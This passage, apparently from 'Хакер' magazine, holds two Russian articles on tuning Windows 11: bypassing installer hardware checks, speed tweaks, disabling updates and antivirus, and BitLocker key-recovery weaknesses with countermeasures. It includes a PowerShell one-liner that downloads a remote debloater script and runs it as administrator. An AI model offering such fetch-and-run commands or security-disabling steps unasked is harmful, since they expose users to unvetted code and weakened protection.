не возникло ни малейших сомнений, на каком именно железе протестировать
Windows 11, прежде чем ставить незнакомую систему на рабочую машину, — я
опасался, что к новому «Главному меню» и видоизмененной «Панели задач»
придется долго привыкать, и не факт, что получится.





                   ThinkPad x200S c Windows 11 на борту

Признаться, я был неприятно удивлен быстродействием Windows 11 на моем
ThinkPad, вернее его полным отсутствием. По сравнению с «десяткой» новая
винда ворочалась еле‑еле, «Проводник» запускался примерно полминуты,
а при открытии нескольких вкладок в браузере система и вовсе впадала
в кому. Очевидно, что это железо для Windows 11 оказалось все‑таки сла‐
боватым, но чтобы настолько… Я принялся срочно изыскивать способы уско‐
рения работы Windows 11, но перед этим я был вынужден повозиться и с
самой установкой — система жаловалась на несовместимость железа и нас‐
тойчиво предлагала поискать в чулане компьютер помощнее. Пришлось при‐
менять кувалду магию. Однако обо всем по порядку.


ОБХОД ПРОВЕРКИ АППАРАТНОЙ СОВМЕСТИМОСТИ
Еще до официального релиза Windows 11  стало  известно: корпорация
Microsoft выкатила такие требования к совместимой аппаратной конфигура‐
ции, будто их писали с оглядкой на суперкомпьютеры Пентагона. Потом
(видимо, под давлением общественности) разработчики включили задний
ход и немного урезали свои запросы, но в списке все равно остались UEFI
с поддержкой безопасной загрузки, доверенный платформенный модуль TPM
2.0 и дисплей высокой четкости 720p. Совершенно очевидно, что ThinkPad
x200S, как и многие другие старые ноутбуки, этой конфигурации совершенно
не соответствует, потому при установке системы я увидел на экране вот такое
грустное сообщение.





                 Ваш компьютер не компьютер

По  счастью,  Microsoft  все‑таки  предусмотрела  возможность  установки
Windows 11 на несовместимое железо в так называемой лабораторной кон‐
фигурации и даже опубликовала соответствующую инструкцию по обходу
ограничений где‑то в глубинах собственного сайта. Ей и воспользуемся.
   Увидев уведомление о несоответствии компьютера фантазиям разработ‐
чиков Windows, жмем «Назад», чтобы вернуться в окно выбора версии ОС,
затем нажимаем на клавиатуре Shift-F10, набираем в открывшемся окне
командной строки regedit и давим Enter. В открывшемся окне редактора
реестра переходим к ветке HKEY_LOCAL_MACHINE\SYSTEM\Setup\ и создаем
там новый раздел LabConfig. В этом разделе создаем три 32-разрядных
параметра   DWORD   с   именами   BypassTPMCheck,   BypassRAMCheck
и BypassSecureBootCheck. После чего двойным щелчком мыши открываем
каждый из этих параметров и присваиваем им значение 1.





              Обманываем программу установки Windows 11

Теперь нужно закрыть «Редактор реестра» и командную строку, а затем про‐
должить установку в прежнем режиме. После вышеперечисленных манипу‐
ляций инсталлятор не будет проверять наличие TPM 2.0, минимально необ‐
ходимый объем оперативки и присутствие в системе UEFI, но ему все равно
потребуется как минимум двухъядерный процессор. Если его нет, то ты снова
увидишь сообщение об аппаратной несовместимости.
  Мой Celeron, по счастью, успешно прошел фейс‑контроль, но винда после
запуска тормозила  так, что работа на  ноутбуке превратилась в сущее
мучение. Существует возможность откатиться обратно к предыдущей версии
Windows в течение первых десяти дней после обновления системы, но этот
шанс был мною счастливо упущен из‑за новогоднего запоя новогодних
каникул. Пришлось изыскивать способы настроить Windows 11 так, чтобы
с ней можно было хоть как‑то работать, не борясь с перманентным желанием
плюнуть в экран ноутбука.


СОЗДАЕМ РЕЗЕРВНУЮ КОПИЮ
Прежде чем ковыряться в настройках винды и системном реестре, имеет
смысл сделать его резервную копию и как минимум создать точку восстанов‐
ления. Реестр можно забэкапить с помощью консольной команды вида reg
export HKLM С:\tmp\hklm.reg, где hklm.reg — файл, в котором будет сох‐
ранено содержимое ветви HKLM. Остальные ветви экспортируются аналогич‐
ным образом, а откат к первоначальным настройкам выполняется путем
запуска reg-файла.
   Чтобы создать точку восстановления, нажми Win-R и в открывшемся окне
«Выполнить» набери sysdm.cpl. В окне  «Свойства  системы»  перейди
ко вкладке «Защита системы», выдели системный диск щелчком мыши и наж‐
ми на кнопку «Создать». Введи название для новой точки восстановления
и жми «ОК».
   Чтобы вернуть Windows к исходному состоянию, перезагрузи ее в режиме
восстановления. Для этого нажми Win-I, в правой части открывшегося окна
нажми на кнопку «Восстановление» и в разделе «Расширенные параметры
запуска» кликни на надписи «Перезагрузить сейчас».





              Перезапуск Windows 11 в режиме восстановления


ПРОСТАЯ НАСТРОЙКА ПРОИЗВОДИТЕЛЬНОСТИ И ВИРТУАЛЬНОЙ
ПАМЯТИ
В Windows 10 и предыдущих версиях существовало отдельное окошко с нас‐
тройками  быстродействия  системы,  позволявшее  отключить  визуальные
эффекты. На скорость отклика интерфейса это порой оказывало целительное
воздействие. Такое же окно есть и в Windows 11, но теперь оно зарыто столь
глубоко, что просто так не отыщешь.
   Чтобы найти эту настройку, открой «Панель управления», щелкни мышью
на кнопке «Система» в левой части окна, промотай список в самый низ и наж‐
ми на надпись «О системе». В открывшейся вкладке нажми на «Дополнитель‐
ные параметры системы». На экране появится окно «Свойства системы».
Нажми на кнопку «Параметры…» в разделе «Быстродействие». В новом окне
выбери пункт «Обеспечить наилучшее быстродействие». Здесь я бы оставил
включенным единственный пункт — «Сглаживание неровностей экранных
шрифтов», поскольку без него интерфейс выглядит совсем уж тоскливо.
Остальными красивостями вполне можно пожертвовать.





                          Настройка быстродействия

В этом же окне открой вкладку «Дополнительно», нажми на кнопку «Изме‐
нить» в разделе «Виртуальная память» и сбрось флажок «Автоматически
выбирать  объем  файла  подкачки».  Затем,  установив  переключатель
в положение «Указать размер», задай минимальный и максимальный раз‐
меры файла подкачки. Рекомендуется давать свопу возможность занимать
как минимум вдвое больше объема твоей оперативки.





                      Настройка размера файла подкачки

Можно разместить файлы подкачки сразу на нескольких дисках. Указав нуж‐
ные параметры, нажми на кнопки «Задать» и «Ок».
   Тут же, в «Панели управления», имеет смысл заглянуть в раздел «Пер‐
сонализация», нажать на кнопку «Цвета» и передвинуть влево переключатель
«Эффекты прозрачности». Конечно, определенную долю шарма оформление
винды от этого утратит, но отключение прозрачности немного снизит нагрузку
на систему.





                         Отключение прозрачности


ОТКЛЮЧАЕМ ФОНОВЫЕ ПРИЛОЖЕНИЯ И ЧИСТИМ АВТОЗАГРУЗКУ
Предыдущие манипуляции не слишком мне помогли: винда немного ожила,
но до требуемого результата оказалось еще очень далеко. Еще один способ
немного встряхнуть систему — отключить лишние процессы вроде Кортаны,
постоянно работающие в фоновом режиме, а заодно убрать все ненужное
из автозагрузки. Этим и займемся.
  В отличие от Windows 10, в 11-й винде исчезла опция отключения сразу
всех фоновых приложений, вместо этого разработчики предлагают поль‐
зователям вырубать их по одному в «Панели управления». За отсутствием
соответствующей  настройки в пользовательском интерфейсе мы можем
обратиться к редактору реестра. Запусти regedit и перейди вот в эту ветку:


HKCU\Software\Microsoft\Windows\CurrentVersion\
BackgroundAccessApplications

В этом разделе создай параметр DWORD c именем GlobalUserDisabled
и присвой ему значение 1. Теперь можно отключить фоновый процесс встро‐
енного поиска Windows. Для этого снова ищем ветку реестра:


HKCU\Software\Microsoft\Windows\CurrentVersion\Search

Создаем параметр DWORD с именем BackgroundAppGlobalToggle и оставля‐
ем у него принятое по умолчанию значение 0.





                  Отключение работы фоновых приложений

Однако в ходе обновления операционка может переписать эти значения
реестра, вернув их в первоначальное состояние, поэтому для надежности
имеет смысл запретить запуск фоновых приложений в групповых политиках
Windows. Нажми Win-R, набери в открывшемся окошке gpedit.msc и нажми
Enter.  Перейди  к  разделу  «Административные  шаблоны →  Компоненты
Windows → Конфиденциальность приложения». В списке отыщи пункт «Раз‐
решить приложениям для Windows работать в фоновом режиме» и дважды
щелкни на нем мышью. В открывшемся окне  установи переключатель
в положение «Включено», а в расположенном ниже меню выбери пункт «Зап‐
ретить принудительно». Затем нажми «Применить» и «Ок».





  Отключение работы фоновых приложений с помощью редактора груп‐
  повых политик

Осталось убрать все лишнее из автозагрузки. Нажми нехитрую комбинацию
клавиш Ctrl-Alt-Del, выбери в открывшемся списке пункт «Диспетчер задач»,
в нижней части окна «Диспетчера» нажми на ссылку «Подробнее» и открой
вкладку «Автозагрузка».





             Отключение автоматически запускаемых программ

Здесь представлены все программы, запускаемые одновременно с операци‐
онной системой. Найди среди них те, которые имеют статус «Включено»,
но при этом не нужны тебе постоянно. При необходимости ты сможешь
запустить их вручную. Щелкай на них правой клавишей мыши и выбирай
в контекстном меню пункт «Отключить».
   Некоторые приложения, запущенные в момент выключения компьютера,
система может перезапускать автоматически при повторном входе. Чтобы
вырубить эту функцию, открой «Панель управления», перейди в раздел «Учет‐
ные записи → Варианты входа» и передвинь влево переключатель «Автомати‐
чески сохранять мои перезапускаемые приложения из системы и перезапус‐
кать их при повторном входе».
   Поотключав таким  образом все  ненужные  приложения,  перезагрузи
компьютер.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИCOVERSTORY
    ОТКЛЮЧИТЬ ВСЁ!

          УСКОРЯЕМ РАБОТУ WINDOWS 11 НА СТАРОМ
                                     ЖЕЛЕЗЕ





ДОПОЛНИТЕЛЬНАЯ НАСТРОЙКА ПОИСКА
По умолчанию в Windows 11 включена индексация файлов, а также так
называемый расширенный поиск, позволяющий искать не только по названи‐
ям файловых объектов, но и по их содержимому. С одной стороны, это очень
удобная возможность, с другой — индексация и расширенный поиск пот‐
ребляют ресурсы системы. Если ты не пользуешься этими функциями, их
можно отключить.
  Для этого открой панель управления («Пуск → Параметры») и перейди
в раздел «Конфиденциальность и защита → Поиск в Windows». Установи
переключатель «Поиск файлов» в положение «Классический стиль».





                        Настройка поиска в Windows 11

Чтобы отключить службу индексирования, нажми Win-R, набери в открыв‐
шемся окошке services.msc и нажми Enter. В списке служб отыщи Windows
Search и дважды щелкни на этой надписи мышью. В открывшемся окне нажми
на кнопку «Остановить», затем в меню «Тип запуска» выбери пункт «Отклю‐
чена», нажми «Применить» и «Ок».





                        Отключение индексирования


ВКЛЮЧЕНИЕ КОНТРОЛЯ ПАМЯТИ
Функция «Контроль памяти» (storage sense) отслеживает объем свободного
дискового пространства на компьютере или ноутбуке и своевременно уда‐
ляет  ненужные  временные  файлы с  дисков,  чтобы  освободить  место.
По умолчанию в Windows 11 эта функция отключена. Чтобы включить ее,
открой панель управления («Пуск → Параметры»), в расположенном слева
списке выбери пункт «Система» и перейди в раздел «Память».





                       Включение контроля памяти

Передвинь вправо переключатель «Контроль памяти» и щелкни мышью
на этой надписи, чтобы настроить функцию удаления лишних файлов на дис‐
ках.





                          Настройка контроля памяти

Здесь можно указать:
 • периодичность  запуска  «Контроля памяти»  (я  выбрал  еженедельный
   запуск);
 • период, через который будут автоматически удаляться неиспользуемые
   файлы из папки «Загрузки» (я выбрал 30 дней);
 • период, спустя который ни разу не открывавшиеся файлы в личных папках
   пользователя будут доступны только в облаке OneDrive, а локальная копия
   будет удалена (функция работает только при использовании учетной
   записи Microsoft и только если синхронизация файлов с OneDrive вклю‐
   чена).

В целом «Контроль памяти» полезен тем, что юзеру больше не нужно думать
об удалении временных файлов, очистке «Корзины» и папки «Загрузки» вруч‐
ную — система будет делать это автоматически через заданные промежутки
времени. Для ноутбуков с небольшим по объему SDD — то, что доктор про‐
писал.


ОТКЛЮЧЕНИЕ ONEDRIVE
Если ты не пользуешься учетной записью Microsoft или попросту не желаешь
хранить свои файлы в «мелкомягком облаке», а также синхронизировать их
на нескольких устройствах под управлением Windows, OneDrive можно отклю‐
чить. Если приложение OneDrive запущено, в области уведомлений панели
задач рядом с часами будет отображаться значок облачка. Если приложение
не запущено, открой главное меню и набери OneDrive в строке поиска.
   Щелкни на значке с изображением облачка в трее правой клавишей
мыши, в открывшемся окне нажми на кнопку «Справка и параметры» и в кон‐
текстном меню выбери пункт «Параметры». В окне «Microsoft OneDrive»
открой вкладку «Параметры» и сбрось флажок «Автоматически запускать
OneDrive при входе в Windows».





                            Отключение OneDrive


ОТКЛЮЧЕНИЕ ИГРОВОГО РЕЖИМА
В Windows 11 «из коробки» включен так называемый «Режим игры» — фун‐
кция, призванная снизить нагрузку на графический ускоритель и центральный
процессор путем перенаправления основных ресурсов на запущенный про‐
цесс игры. Поскольку на моем ноутбуке из игр установлен только пасьянс
«Косынка», эту функцию я на всякий случай отключил.
   Делается это так: в панели управления переходим в раздел «Игры»,
нажимаем на кнопку «Игровой режим» и на следующем экране перемещаем
выключатель «Режим игры» влево.





                          Отключение режима игры

После этого можно заглянуть в соседний раздел «Xbox Game Bar» и вык‐
лючить функцию «Открывайте Xbox Game Bar нажатием этой кнопки на гей‐
мпаде» — если ты этим самым геймпадом не пользуешься.


ВКЛЮЧЕНИЕ МАКСИМАЛЬНОЙ ПРОИЗВОДИТЕЛЬНОСТИ
В ПАРАМЕТРАХ ЭЛЕКТРОПИТАНИЯ
В настройках электропитания Windows 11 по умолчанию включен сбалан‐
сированный режим, который  использует щадящие параметры  произво‐
дительности процессора. Для ноутбуков лучше всего оставить именно этот
режим, но если винда установлена на настольном ПК, можно не стесняться
и задействовать его возможности по максимуму. Для этого в панели управле‐
ния перейди в раздел «Система → Завершение работы и батарея» и в рас‐
положенном справа меню «Режим питания» выбери пункт «Макс. произво‐
дительность».
   Если этот пункт в меню отсутствует, придется немного поколдовать. Наж‐
ми на значок лупы в панели задач, введи в строке поиска «панель управле‐
ния», чтобы открыть классический вариант этой панели, в расположенном
справа сверху меню «Просмотр» выбери пункт «Крупные значки», затем щел‐
кни мышью на значке «Электропитание». В расположенном слева списке наж‐
ми на надпись «Создание схемы управления питанием», установи перек‐
лючатель в положение «Высокая производительность» и нажми «Далее».
В следующем окне отключи переход в спящий режим при работе компьютера
от сети и нажми на кнопку «Создать».





          Включение режима максимальной производительности


ОТКЛЮЧЕНИЕ КОМПОНЕНТОВ WINDOWS И УДАЛЕНИЕ ПРОГРАММ
В обновленной панели управления Windows 11 есть свой апплет для удаления
ранее установленных программ, но мне более привычно классическое окно.
Чтобы открыть его, нажми Win-R, набери в открывшемся окошке appwiz.cpl
и нажми Enter. Откроется классическое окно «Установка и удаление прог‐
рамм» — такое же, как в старой и любимой всеми Windows 7. Как им поль‐
зоваться, думаю, объяснять никому не нужно.





                        Удаление лишних программ

Слева в этом окне — надпись «Включение и отключение компонентов
Windows», клик по которой открывает окно со списком системных компонен‐
тов. Следует помнить, что эта функция именно отключает ненужные функции
Windows, но не удаляет соответствующие файлы с диска, поэтому поль‐
зоваться этим инструментом с целью экономии дискового пространства бес‐
полезно чуть менее, чем полностью. Для удаления же ненужных модулей есть
более продвинутый инструмент, о котором я расскажу далее.


ИСПОЛЬЗОВАНИЕ WINDOWS10DEBLOATER
Windows10Debloater — это скрипт на PowerShell, созданный независимыми
разработчиками еще для Windows 10. Он позволяет удалить из системы
ненужные службы и приложения. Я протестировал этот скрипт в Windows 11,
и в целом он отработал нормально. Однако его все‑таки следует исполь‐
зовать с осторожностью: мало ли что он отломает в новой версии ОС?
В общем, я предупредил!
   Чтобы  запустить  Windows10Debloater,  открой  главное меню, набери
в строке поиска powershell, затем нажми на стрелочку справа от появив‐
шегося значка Windows PowerShell и кликни на надписи «Запуск от имени
администратора» в правой части окна.





                 Запуск PowerShell от имени администратора

В открывшемся окне PowerShell набери следующую команду:


iwr -useb https://git.io/debloat|iex

Команда автоматически загрузит и запустит Windows10Debloater. Внешний
вид приложения показан на следующем скриншоте.





                          Windows10Debloater

Нажатием буквально одной кнопки в окне Windows10Debloater можно выпол‐
нить следующие действия:
 • Uninstall OneDrive — полностью удалить OneDrive из Windows;
 • Unpin Tiles from Start Menu — в Windows 11 не работает;
 • Disable Telemetry/Tasks — полностью отключает сбор данных и связанные
   с телеметрией задачи планировщика задач Windows;
 • Remove Bloatware regkeys — удаляет из реестра ключи, связанные с «лиш‐
   ними» приложениями;
 •  Install .NET V3.5 — устанавливает .Net Framework версии 3.5.

Чуть выше можно отключить нажатием кнопки Disable Кортану, просмотр PDF-
файлов в браузере Edge и использование темной темы Windows.
   Чтобы выбрать приложения, которые Windows10Debloater позволяет уда‐
лить, нажми на кнопку Customise Blocklist. Программа выдаст список всех
доступных компонентов. Здесь можно удалить игры, приложение Xbox, даже
калькулятор, Paint и другие стандартные программы. Сбрось флажки с наз‐
ваний тех компонентов, которые ты хочешь оставить в Windows, а потом наж‐
ми на кнопку «Save custom Allowlist and Blocklist to custom-lists.ps1». Если ты
сомневаешься в том, нужно ли тебе какое‑либо приложение из списка, лучше
не удалять его. На всякий случай повторю еще раз: установка флажка
удалит приложение, а снятие его, наоборот, сохранит.





                    Выбор приложений для удаления

Теперь можно удалить выбранные приложения нажатием на кнопку «Remove
bloatware with custom blocklist». После завершения процедуры перезагрузи
компьютер, чтобы изменения вступили в силу.


ВЫВОДЫ
В результате всех проделанных мною магических манипуляций Windows
11 начала работать намного шустрее. Особенно ускорение стало заметно
после отключения поисковой индексации и блокировки фоновых приложений.
Конечно, «летать» винда все‑таки не научилась, но прогресс в плане быстро‐
действия стал очевиден, и работать на ноутбуке стало намного приятнее.
Надеюсь, эти советы помогут тебе ускорить Windows 11 и на твоем компьюте‐
ре, даже если его конфигурация не соответствует требованиям Microsoft.
 COVERSTORY





 Денис Колисниченко
Постоянный автор журнала
         «Хакер»
   dhsilabs@gmail.com



ТВИКИНГ
WINDOWS 11

 НАСТРАИВАЕМ АВТООБНОВЛЕНИЯ,
 АНТИВИРУС И ШИФРОВАНИЕ




 Появившаяся в уходящем году версия Windows отличается
 от предшественниц не только обновленным интерфейсом,
 но и целым рядом новинок, спрятанных «под капотом». Нас‐
 тало время поговорить об этих инструментах и рассмотреть
 некоторые особенности их использования.


 В сегодняшней статье мы расскажем, как настроить или вовсе отключить
  автоматические обновления, как выключить встроенный в Windows 11 анти‐
  вирус или добавить в список его исключений нужные объекты. Обсудим, так
  ли надежен BitLocker, как кажется, и поговорим о методах противодействия
  его взлому. И наконец, рассмотрим функцию облачной загрузки и переуста‐
  новки Windows.


 ОБНОВЛЕНИЕ И ЕГО ОТКЛЮЧЕНИЕ
  Для самого обновления системы тебе ничего не нужно делать — оно выпол‐
  няется в фоновом режиме, а когда обновления будут загружены, они уста‐
  новятся при следующем перезапуске компа. При этом в меню завершения
  работы появятся новые варианты: завершение работы с последующей уста‐
  новкой обновления или без таковой. Например, можно просто перезагрузить
  компьютер,  а  можно  перезагрузить  и  обновить  систему.  Наконец‑то
  в Microsoft догадались, что установка обновлений занимает немало времени
  и не всегда у пользователя есть возможность ждать, пока они будут установ‐
  лены. А еще наконец‑то в Windows 11 поменяли цвет фона экрана обновле‐
  ний — он стал черным, а не синим, как было раньше (все мы знаем, что еще с
  Windows 98 синий цвет ассоциируется с экраном смерти Windows).





    Тайна черного экрана. Можешь прогуляться на кухню и выпить чашку
    такого же черного кофе. И не одну…

  Экран  «Параметры,  Центр  обновления  Windows»  позволяет  управлять
  обновлениями  системы.  Например,  пользователь может  приостановить
  обновления на некоторое время. Для их возобновления раньше указанного
  периода используется кнопка «Возобновить обновления».
    Здесь же можно вызвать журнал обновлений, позволяющий просмотреть,
  какие обновления были установлены до этого. Кнопка «Удалить обновления»
  позволяет удалить загруженные, но еще не установленные обновления.





                          Центр обновления

 В дополнительных параметрах спрятаны различные настройки обновлений.
 Самые полезные из них — «Период активности», «Скачивать обновления
  через  лимитные  подключения» и  «Уведомлять меня о  необходимости
  перезагрузки для завершения обновления».





                             Журнал обновлений

  «Период активности» говорит системе, чтобы она не мешала тебе пред‐
  ложениями обновить систему, когда ты работаешь за компом. По умолчанию
  используется значение с 8:00 до 17:00, думаю, нужно изменить как минимум
  с 8:00 до 20:00, учитывая современный «удаленный» график.
     Обязательно  нужно  убедиться,  что  выключен  параметр  «Скачивать
  обновления через лимитные подключения» и включен «Уведомлять меня
  о  необходимости  перезагрузки для завершения  обновления» —  тогда
  перезагрузка при  обновлении не  станет  неожиданностью, а  когда ты
  в отпуске или в командировке, ты будешь пользоваться услугами роуминга
  или тарифицируемым Wi-Fi. В такие периоды нужно, чтобы твое соединение,
  через которое ты подключаешься к интернету, было помечено как лимитное.
  Кстати, это один из простых способов отключить обновления навсегда —
  если у тебя стационарный компьютер или ноутбук, который используется
  только дома, и ты подключаешься постоянно к сети через одно и то же соеди‐
  нение (неважно, Ethernet или Wi-Fi), просто пометь его как лимитное (так мож‐
  но пометить даже Ethernet-соединение).





                      Помечаем соединение как лимитное

  Теперь о том, как  отключить обновления насовсем. Во‑первых, можно
  пометить соединение как лимитное, как я уже предлагал выше. Но при под‐
  ключении к сети через другое соединение, которое не помечено как лимит‐
  ное, система начнет загружать обновления снова.
    Не хочется долго дискутировать на тему, нужно ли отключать обновления
  или нет, лучше расскажу, как их выключить, а там уже каждый сам решает —
  воспользоваться советом или нет. Итак, для отключения обновлений выполни
  следующие действия:
   1. Нажми Win + R и запусти редактор групповой политики gpedit.msc.
   2. Перейди в раздел «Конфигурация компьютера → Административные шаб‐
    лоны → Компоненты Windows → Центр обновления Windows → Управление
    интерфейсом пользователя» и найди политику «Настройка автоматичес‐
     кого обновления».
   3. Дважды щелкни по политике и задай значение «Отключено». Нажми кнопку
    OK.
   4. Перезагрузи компьютер.
   5. Открой окно «Параметры» и перейди в  раздел «Центр обновления
     Windows», чтобы убедиться, что обновления выключены. Ты должен уви‐
     деть сообщение, что «что‑то пошло не так». Хотя в Windows 10 в этом слу‐
    чае было уведомление о том, что обновлениями управляет организация.
    Но в любом случае цель достигнута.





                            Редактор групповой политики





                            Отключение обновлений





                            Обновления выключены


 НАСКОЛЬКО БЕЗОПАСЕН BITLOCKER? КАК ВЗЛОМАТЬ И КАК
 ЗАЩИТИТЬСЯ
  BitLocker — очень надежная система, но и она всего лишь компромисс между
  скоростью, удобством для пользователя и надежностью. Все эти три фактора
  плохо сочетаются друг с другом: если выбрать скорость и удобство, то
  не будет надежности (что‑то вроде современных автомобилей). Если надеж‐
  ность и скорость (например, спортивный автомобиль), то вряд ли такое
  решение будет удобным. Если же ты голосуешь за надежность и удобство
  (туристический автобус), то решение нельзя назвать быстрым. В BitLocker
  разработчики попытались все эти три качества совместить. Получилось
  довольно быстро, очень удобно и в меру надежно.
   С надежностью защиты данных есть нюансы. Конечно, это не EFS, где
  с помощью утилиты сторонних разработчиков можно расшифровать зашиф‐
  рованные тобой файлы. Нет. С шифрованием все как раз нормально. Проб‐
  лема в самой реализации. Самая опасная штука в BitLocker — это ключ вос‐
  становления. Представим, что есть два диска: системный и диск Е:, который
  был зашифрован с помощью BitLocker, и на нем хранятся самые важные дан‐
  ные. Кому‑то нужно получить доступ к этой информации. Как он это сделает?
 Да  достаточно  просто: поищет по  системному  диску  текстовые файлы
  со строкой «Ключ восстановления». Если у пользователя хватило ума сох‐
  ранить его на локальном компьютере, можно быть уверенным — защиту
  с легкостью вскроют.
    К BitLocker претензий нет — это чистой воды человеческий фактор. Чтобы
  такого не произошло, нужно придерживаться следующих простых правил:
   1. Сохрани файл восстановления под именем, отличным от имени по умол‐
    чанию. Например, software.key. Лучше всего сохранять на флешку
    или на SD-карту смартфона — чтобы никто не нашел. Сохранять ключ
    на локальном компьютере — плохая идея.
   2. Открой сохраненный файл в любом текстовом редакторе. Подойдет обыч‐
    ный блокнот. Удали из него все, кроме самого ключа восстановления.
    Ключ восстановления сойдет за серийник к какой‑то программе, и даже
    если злоумышленник обнаружит его на флешке, то подумает, что это нечто
     иное. Для большей маскировки можно несколько раз скопировать его
    и заменить некоторые символы, а напротив каждой копии написать наз‐
    вание какой‑то программы,  чтобы  точно можно было подумать, что
     это серийники к разным программам.
   3. У правильного ключа замени одну‑две цифры. Например, пусть ключ будет
     следующим:      326304-090167-116930-346555-351241-488092-701602-
     527483. Первую и последнюю тройки замени девятками, то есть получит‐
     ся 926304-090167-116930-346555-351241-488092-701602-527489. Даже
    если злоумышленник скопирует этот ключ и вставит в окно восстанов‐
     ления, открыть диск у него не получится. Главное потом не забыть, какие
     цифры и на какие поменял.
   4. Не храни ключи восстановления в учетной записи Microsoft. Ты уверен, что
    ее невозможно взломать? А есть уверенность, что Microsoft не передаст
     эти ключи восстановления по официальному запросу? Если ты так сглупил
    и     сохранил    ключ     в     ней,     перейди    по     адресу
     https://account.microsoft.com/devices/recoverykey и удали все имеющиеся
    там ключи. Это спасет только от хакеров, которые взломают твою учетную
     запись. А вот от самой Microsoft вряд ли, поскольку твои ключи уже навер‐
     няка скопированы. На всякий случай поменяй пароли ко всем зашиф‐
     рованным дискам и больше не сохраняй ключи в учетке.

  Итак, мы только что закрыли самую большую проблему BitLocker. Но это
 еще далеко не все. Попробуй зашифровать диск с данными. Даже если
  на нем сейчас нет данных — просто скачай несколько фильмов из интернета,
  чтобы заполнить диск хотя бы на 20–30%. Включи шифрование BitLocker.
  Шифрование займет некоторое время — все зависит от объема информа‐
  ции, хранящейся на диске, и от производительности самого диска (на SSD
  все пройдет быстрее).
    А  теперь  попробуй  отключить  шифрование  (команда  «Отключить
  BitLocker»). Отключение произойдет мгновенно. Оказывается, при отклю‐
  чении BitLocker не расшифровывает данные. Все секторы так и останутся
  зашифрованными ключом FVEK (Full Volume Encryption Key — ключ шиф‐
  рования всего тома). Но доступ к этому ключу больше никак не будет огра‐
  ничиваться. Все проверки будут выключены, а VMK (Volume Master Key — мас‐
  тер‑ключ тома) просто останется записанным среди метаданных в открытом
  виде. Если ты зашифровал системный диск, то загрузчик операционной сис‐
  темы считает VMK, автоматически расшифрует FVEK, а после и все файлы —
  по мере обращения к ним. Для пользователя все это будет выглядеть
  как отсутствие шифрования, но на самом деле шифрование все еще вклю‐
  чено, и будет наблюдаться некоторое снижение производительности.
     Вторая дыра BitLocker связана как раз с VMK. Ключи шифрования хранятся
  в оперативной памяти — иначе пользователю пришлось бы отдельно рас‐
  шифровывать каждый файл при обращении к нему. Это означает, что можно
  сделать дамп памяти, например с помощью программы RAM Capture, найти
  ключ и получить доступ к диску. К примеру, когда ты отойдешь от компьютера
  на перекур или попить кофе, твой коллега может легко сделать дамп памяти
  на флешку — флешки с поддержкой USB 3.0 уже давно доступны, а размер
  памяти в большинстве случаев составляет 8–16 Гбайт, так что на создание
  дампа не уйдет много времени.
     Защититься от этого можно, если установить сложный пароль для учетной
  записи (или настроить биометрию, например по отпечатку пальца) и задать
  небольшой  интервал  для  экранной  заставки,  скажем  в  одну  минуту.
 При использовании биометрии для входа в учетную запись это вообще
  не составит никаких неудобств. Просто приложи палец к сканеру, и компь‐
  ютер будет разблокирован. Если же используется разблокировка по паролю,
  то вводить каждый раз сложный пароль неудобно — это факт.
     Также VMK может храниться в файле гибернации hiberfil.sys. Это озна‐
  чает, что если кто‑то извлечет жесткий диск из твоего компьютера и пороется
  в hiberfil.sys, то сможет найти мастер‑ключ для разблокировки BitLocker-
  диска. Чтобы такого не произошло, нужно отключить режим гибернации
  (команда powercfg -h off от имени админа) и удалить файл hiberfil.sys.
 В результате ты не только обезопасишь себя, но еще и сэкономишь немного
  места на диске. Недостаток — Windows будет загружаться немного мед‐
  леннее.
     Наконец, последний нюанс. Если твой компьютер — часть домена Active
  Directory, то все твои ключи восстановления хранятся на контроллере AD.
  Другими словами, админ AD может разблокировать любой диск на предпри‐
  ятии. От этого никак не уйти и не избавиться (если администратор сам
  не отключит данную фичу с помощью групповых политик). Просто нужно знать
  об этом. Может, и к лучшему — если потеряется ключ восстановления, то
  администратор сможет помочь.


                                       Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИCOVERSTORY
 ТВИКИНГ WINDOWS 11
                 НАСТРАИВАЕМ АВТООБНОВЛЕНИЯ,
                     АНТИВИРУС И ШИФРОВАНИЕ





РАЗРЕШЕННЫЕ УГРОЗЫ — ИСКЛЮЧЕНИЯ ДЛЯ АНТИВИРУСА
Штатный антивирус Windows довольно хорош, вот только не все доверяют его
возможностям и устанавливают сторонние решения. А поскольку устанав‐
ливаются, как правило, бесплатные антивирусы, то толку от них немного.
   Иногда антивирус неправильно определяет угрозы и может «жаловаться»
на необходимые для пользователя программы. Чтобы антивирус и такие
программы смогли уживаться на компьютере, их нужно добавить в список
исключения.
  Для этого выполни следующие действия:
 1. В окне «Безопасность Windows» перейди в раздел «Защита от вирусов
   и угроз».
 2. Пролистай экран и найди ссылку «Управление настройками», перейди
   по ней.
 3. Пролистай экран в самый низ и нажми ссылку «Добавление или удаление
   исключений».
 4. Нажми кнопку «Добавить исключение», выбери тип исключения: файл, пап‐
   ка, программа и так далее.
 5. Выбери объект для исключения. На следующем рисунке показано, что
   в список для исключений добавлена папка C:\temp.





                          Управление исключениями


ВРЕМЕННОЕ ОТКЛЮЧЕНИЕ АНТИВИРУСА
Антивирус в Windows 11 нельзя выключить навсегда. Можно его временно
деактивировать, но через непродолжительное время он обязательно запус‐
тится снова.
   Существует только один способ полностью выключить антивирус: уста‐
новить нештатную антивирусную программу, например тот же Avast. Исполь‐
зуя интерфейс антивируса, нужно его полностью выключить. Когда в системе
установлен нештатный антивирус, стандартный отключается, пока не будет
удален сторонний продукт.
  Для временного отключения антивируса в разделе «Параметры защиты
от вирусов и других угроз» выключи единственный переключатель в секции
«Защита в режиме реального времени».





                       Антивирус временно выключен


БЛОКИРОВКА ПОТЕНЦИАЛЬНО НЕЖЕЛАТЕЛЬНЫХ ПРОГРАММ ИЛИ
ЗАЩИТА НА ОСНОВЕ РЕПУТАЦИИ
В одной из последних сборок Windows 10 появилась защита от потенциально
нежелательных программ. Эта функция есть и в Windows 11. Открой приложе‐
ние «Безопасность Windows» и перейди в раздел «Управление приложе‐
ниями/браузером». Здесь и находится новый раздел «Защита на основе
репутации».





                       Защита на основе репутации

Однако не спеши нажимать кнопку «Включить». Щелкни по ссылке «Парамет‐
ры защиты на основе репутации». На новой странице параметров сгруп‐
пированы настройки, позволяющие включить или отключить отдельные ком‐
поненты  защиты:   «Проверка  приложений  и  файлов»,  «SmartScreen
для Microsoft Edge», «SmartScreen для приложений из Microsoft Store», а также
новая  опция  «Блокировка  потенциально  нежелательного  приложения»,
которая позволяет включить или отключить защиту от нежелательных прог‐
рамм в защитнике Windows.


